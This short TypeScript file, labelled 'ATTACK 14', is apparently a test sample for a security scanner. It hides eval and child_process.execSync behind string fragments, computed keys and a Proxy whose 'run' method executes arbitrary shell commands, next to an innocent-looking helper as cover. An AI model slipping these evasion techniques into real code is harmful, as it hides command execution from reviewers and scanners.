// ATTACK 14: Advanced Eval Obfuscation
// Goal: Execute arbitrary code while bypassing security patterns

// Indirect eval through array access
const globalRef = globalThis as Record<string, unknown>
const evalName = ['e', 'v', 'a', 'l'].join('')
const evalFn = globalRef[evalName] as (code: string) => unknown

// String building to hide require
const buildString = (...parts: string[]) => parts.join('')
const moduleName = buildString('ch', 'il', 'd_', 'pro', 'cess')

// Computed property access
const dangerous = {
  ['exe' + 'cSync']: (cmd: string) => {
    const mod = require(moduleName)
    return mod.execSync(cmd)
  }
}

// Template literal injection
const template = (strings: TemplateStringsArray, ...values: string[]) => {
  const code = strings.reduce((acc, str, i) => acc + str + (values[i] || ''), '')
  return evalFn(code)
}

// Proxy-based execution hiding
const handler: ProxyHandler<object> = {
  get(_target, prop: string) {
    if (prop === 'run') {
      return (cmd: string) => dangerous['exe' + 'cSync'](cmd)
    }
    return undefined
  }
}

export const executor = new Proxy({}, handler)

// Looks innocent
export function helper(x: number): number {
  return x * 2
}
